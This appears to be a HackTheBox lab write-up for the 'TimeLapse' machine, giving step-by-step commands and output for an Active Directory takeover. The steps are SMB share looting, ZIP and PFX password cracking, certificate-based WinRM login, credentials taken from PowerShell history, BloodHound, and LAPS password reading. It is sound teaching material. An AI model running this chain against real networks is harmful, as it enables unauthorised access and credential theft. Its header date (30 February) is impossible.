---
title: "TimeLapse @ HackTheBox"
date: 2023-02-30 09:00:00 +0200
categories: [Writeups, HackTheBox]
tags: [active-directory, windows, smb, winrm, kerberos, ldap, bloodhound, laps, privilege-escalation, certificates, zip2john, pfx2john]
author: andrea
image:
  path: /commons/timelapse.jpg
  no_bg: true
---

## Enumeration

We start with a full TCP port scan:

```bash
nmap -sC -sV -p- 10.129.227.113
```

We obtain:

```text
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP
3269/tcp  open  globalcatLDAPssl
5986/tcp  open  ssl/winrm
9389/tcp  open  mc-nmf
49666/tcp open  msrpc
49677/tcp open  ncacn_http
49678/tcp open  msrpc
49699/tcp open  msrpc
```

The presence of Kerberos, LDAP, Global Catalog, SMB and WinRM indicates that the target is a Windows Active Directory environment.

Since SMB is exposed, we start by enumerating the available shares.

## SMB Enumeration

We can list the shares without authentication using `smbclient`:

```bash
smbclient -L //10.129.227.113 -N
```

The server returns:

```text
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share
Shares          Disk
SYSVOL          Disk      Logon server share
```

Most of these are standard Windows/Active Directory shares. `Shares` is different because it is not one of the standard administrative or domain-controller shares, so we should enumerate it.

```bash
smbclient //10.129.227.113/Shares -N
```

We can list its contents:

```text
smb: \> dir

  .                                   D        0  Mon Oct 25 11:39:15 2021
  ..                                  D        0  Mon Oct 25 11:39:15 2021
  Dev                                 D        0  Mon Oct 25 15:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 11:48:42 2021

        6367231 blocks of size 4096. 1282456 blocks available
```

The `Dev` directory contains a file called `winrm_backup.zip`:

```text
smb: \> cd Dev
smb: \Dev\> dir

  .                                   D        0  Mon Oct 25 15:40:06 2021
  ..                                  D        0  Mon Oct 25 15:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 11:46:42 2021

        6367231 blocks of size 4096. 1283366 blocks available
```

The filename is relevant because WinRM is exposed on port `5986`. We download the archive:

```text
smb: \Dev\> get winrm_backup.zip

getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip
(21.8 KiloBytes/sec) (average 21.8 KiloBytes/sec)
```

## Cracking the ZIP Password

The archive contains a PFX file, but it is password protected:

```bash
unzip winrm_backup.zip
```

Output:

```text
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password:
```

Since the archive uses ZIP encryption, we can use `zip2john` to extract the password hash and then crack it with John the Ripper.

```bash
zip2john winrm_backup.zip > zip.hash
```

The resulting hash contains information about the encrypted file:

```text
ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx
PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683
ts=72AA cs=72aa type=8
```

We can now run John:

```bash
john zip.hash
```

The output shows that John successfully loaded a PKZIP hash:

```text
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status

supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)

1g 0:00:00:00 DONE (2026-08-24 09:52)
2.325g/s 8077Kp/s 8077Kc/s 8077KC/s suzyqzb..superkebab

Use the "--show" option to display all of the cracked passwords reliably

Session completed.
```

The password is:

```text
supremelegacy
```

We can now extract the PFX:

```bash
unzip winrm_backup.zip
```

Output:

```text
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password:
  inflating: legacyy_dev_auth.pfx
```

## PFX Analysis

The extracted file is a PKCS#12 archive containing a certificate and a private key.

We can inspect it with OpenSSL:

```bash
openssl pkcs12 -info -in legacyy_dev_auth.pfx
```

OpenSSL asks for another password:

```text
Enter Import Password:
```

Therefore, the ZIP password only protected the archive itself. The PFX has its own password.

We can again convert the file into a format supported by John the Ripper:

```bash
pfx2john legacyy_dev_auth.pfx > legacyy_dev_auth.pfx.hash
```

Then run John:

```bash
john legacyy_dev_auth.pfx.hash
```

The relevant output is:

```text
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes

Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status

thuglegacy       (legacyy_dev_auth.pfx)

1g 0:00:01:06 DONE (2026-08-24 09:57)
0.01510g/s 48803p/s 48803c/s 48803C/s thumper1990..thsco04

Use the "--show" option to display all of the cracked passwords reliably

Session completed.
```

The PFX password is:

```text
thuglegacy
```

We can now inspect the contents:

```bash
openssl pkcs12 -info -in legacyy_dev_auth.pfx
```

The output contains both a private key and a certificate:

```text
MAC: sha1, Iteration 2000
MAC length: 20, salt length: 20

PKCS7 Data

Shrouded Keybag: pbeWithSHA1And3-KeyTripleDES-CBC, Iteration 2000

Bag Attributes
    Microsoft Local Key set: <No Values>
    localKeyID: 01 00 00 00
    friendlyName: te-4a534157-c8f1-4724-8db6-ed12f25c2a9b
    Microsoft CSP Name: Microsoft Software Key Storage Provider

Key Attributes
    X509v3 Key Usage: 90

PKCS7 Data

Certificate bag

Bag Attributes
    localKeyID: 01 00 00 00

subject=CN=Legacyy
issuer=CN=Legacyy
```

The certificate identifies the user as `Legacyy`. The certificate also contains the domain identity:

```text
legacyy@timelapse.htb
```

This is useful because WinRM is exposed over HTTPS and can support certificate-based authentication.

## Extracting the Certificate and Private Key

We extract the certificate without the private key:

```bash
openssl pkcs12 \
    -in legacyy_dev_auth.pfx \
    -clcerts \
    -nokeys \
    -out cert.pem
```

Then we extract the private key:

```bash
openssl pkcs12 \
    -in legacyy_dev_auth.pfx \
    -nocerts \
    -out key.pem
```

After entering the PFX password and setting a PEM passphrase for the private key, we have:

```text
cert.pem
key.pem
```

These files can now be used with Evil-WinRM.

## Initial Access

Since WinRM over HTTPS is available on port `5986`, we can attempt certificate-based authentication:

```bash
evil-winrm \
    -S \
    -i 10.129.227.113 \
    -c cert.pem \
    -k key.pem
```

Evil-WinRM establishes the connection:

```text
Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation:
undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub:
https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint

Enter PEM pass phrase:

*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
timelapse\legacyy
```

We now have a shell as:

```text
timelapse\legacyy
```

## Credential Enumeration

After obtaining an initial shell, we perform local enumeration. One of the files found by WinPEAS is the PowerShell PSReadLine history:

```text
C:\Users\legacyy\APPDATA\roaming\microsoft\windows\powershell\PSReadLine\ConsoleHost_history.txt
```

We can inspect it:

```powershell
type C:\Users\legacyy\APPDATA\roaming\microsoft\windows\powershell\PSReadLine\ConsoleHost_history.txt
```

The history contains several commands:

```text
whoami
ipconfig /all
netstat -ano |select-string LIST

$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck

$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force

$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)

invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}

get-aduser -filter * -properties *

exit
```

The important part is the `PSCredential` object:

```powershell
$c = New-Object System.Management.Automation.PSCredential (
    'svc_deploy',
    $p
)
```

The password is passed to `ConvertTo-SecureString` as plaintext, which means the PowerShell history contains valid credentials for `svc_deploy`.

We can verify that these are valid domain credentials using NetExec:

```bash
nxc smb 10.129.227.113 \
    -u svc_deploy \
    -p 'E3R$Q62^12p7PLlC%KWaxuaV'
```

The result confirms successful authentication:

```text
SMB  10.129.227.113  445  DC01
[*] Windows 10 / Server 2019 Build 17763 x64
[*] domain: timelapse.htb
[*] signing: True
[*] SMBv1: False

[+] timelapse.htb\svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV
```

We can therefore authenticate to WinRM directly as `svc_deploy`:

```bash
evil-winrm \
    -i 10.129.227.113 \
    -u svc_deploy \
    -p 'E3R$Q62^12p7PLlC%KWaxuaV' \
    -S
```

The connection succeeds:

```text
Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation:
undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub:
https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami
timelapse\svc_deploy
```

We have now moved from the certificate-based `legacyy` account to a regular domain account.

## Privilege Escalation

At this point, we need to determine what permissions `svc_deploy` has inside the Active Directory environment.

BloodHound is useful for this because it allows us to visualize relationships between users, groups and computers instead of manually checking every possible permission.

We collect the Active Directory data with:

```bash
bloodhound-python \
    -d timelapse.htb \
    -u svc_deploy \
    -p 'E3R$Q62^12p7PLlC%KWaxuaV' \
    -c All \
    -ns 10.129.227.113
```

The collection completes successfully:

```text
INFO: Found AD domain: timelapse.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication.
Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)

INFO: Connecting to LDAP server: dc01.timelapse.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 4 computers
INFO: Found 11 users
INFO: Found 55 groups
INFO: Found 2 gpos
INFO: Found 10 ous
INFO: Found 19 containers
INFO: Found 0 trusts

INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc01.timelapse.htb
INFO: Done in 00M 15S
```

The Kerberos error is caused by a clock skew between our attacking machine and the Domain Controller. BloodHound falls back to NTLM, so the collection can still proceed.

Looking at the BloodHound relationships, we find that `svc_deploy` is a member of LAPS_Readers.

![alt text](/assets/img/posts/timelapse/blood1.png)

The important permission associated with this group is the ability to read LAPS credentials for `DC01`.

### LAPS Enumeration

LAPS stores and rotates the password used by the local administrator account on managed Windows computers.

If an Active Directory user has permission to read the corresponding LAPS attribute, that user can retrieve the current local administrator password for the target computer.

Since `svc_deploy` has the required permissions, we can query the computer object directly from PowerShell:

```powershell
Get-ADComputer DC01 `
    -Properties 'ms-Mcs-AdmPwd','ms-Mcs-AdmPwdExpirationTime' |
    Select-Object Name,
        'ms-Mcs-AdmPwd',
        'ms-Mcs-AdmPwdExpirationTime'
```

The result contains the LAPS password:

```text
Name  ms-Mcs-AdmPwd            ms-Mcs-AdmPwdExpirationTime
----  -------------             ---------------------------
DC01  6A,E.D!!OElIn178+jaqvK-8  134325135787083126
```

The value stored in `ms-Mcs-AdmPwd` is the current password of the local `Administrator` account on `DC01`.

## Administrator Access

We can now authenticate to WinRM using the Administrator account and the recovered LAPS password:

```bash
evil-winrm \
    -i 10.129.227.113 \
    -u administrator \
    -p '6A,E.D!!OElIn178+jaqvK-8' \
    -S
```

Evil-WinRM successfully establishes the session:

```text
Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation:
undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub:
https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
timelapse\administrator
```